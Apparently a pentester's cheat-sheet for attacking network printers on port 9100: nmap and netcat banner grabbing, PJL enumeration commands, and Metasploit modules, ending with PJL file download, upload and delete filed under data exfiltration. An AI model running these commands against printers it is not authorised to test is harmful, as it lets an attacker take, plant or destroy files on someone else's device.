# Printers

## 01 - Banner Grab

```
$ nmap -p 9100 -sV -Pn -n <IP>
```

Establish connection through the printer's port.

```
$ nc -vn <IP> 9100
```

## 02 - Enumeration

```
@PJL INFO STATUS      #CODE=40000   DISPLAY="Sleep"   ONLINE=TRUE
```

```
@PJL INFO ID          # ID (Brand an version): Brother HL-L2360D series:84U-F75:Ver.b.26
```

```
@PJL INFO PRODINFO    #Product info
```

```
@PJL FSDIRLIST

@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535  #List dir

msf > use auxiliary/scanner/printer/printer_list_dir
```

```
@PJL INFO VARIABLES   #Env variales

msf > use auxiliary/scanner/printer/printer_env_vars
```

```
@PJL INFO FILESYS     #?
```

```
@PJL INFO TIMEOUT     #Timeout variables
```

```
@PJL RDYMSG           #Ready message

$ nmap -p 9100 -Pn -n --script-help pjl-ready-message --script-args 'pjl_ready_message="<message>"' <IP>

msf > use auxiliary/scanner/printer/printer_ready_message
```

```
@PJL FSINIT
```

```
msf > use auxiliary/scanner/printer/printer_list_volumes

msf > use auxiliary/scanner/printer/printer_version_info
```

TODO: Re-arrange them to **File Transfer and Data Exfiltration** section

```
@PJL FSDOWNLOAD       #Useful to download a file

msf > use auxiliary/scanner/printer/printer_download_file
```

```
@PJL FSUPLOAD         #Useful to upload a file

msf > use auxiliary/scanner/printer/printer_upload_file
```

```
@PJL FSDELETE         #Useful to delete a file

msf > use auxiliary/scanner/printer/printer_delete_file
```

---
## References

### Backlinks

- [[PRET|Initial Access: Printers]]

### Hacktricks

- [Hacktricks: Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)](https://book.hacktricks.wiki/en/network-services-pentesting/9100-pjl.html)

### Network Mapper NSE Docs

- [Network Mapper NSEDocs: pjl-ready-message Script](https://nmap.org/nsedoc/scripts/pjl-ready-message.html)

### Hacking Printers

- [Hacking Printers](https://hacking-printers.net/wiki/index.php/Main_Page)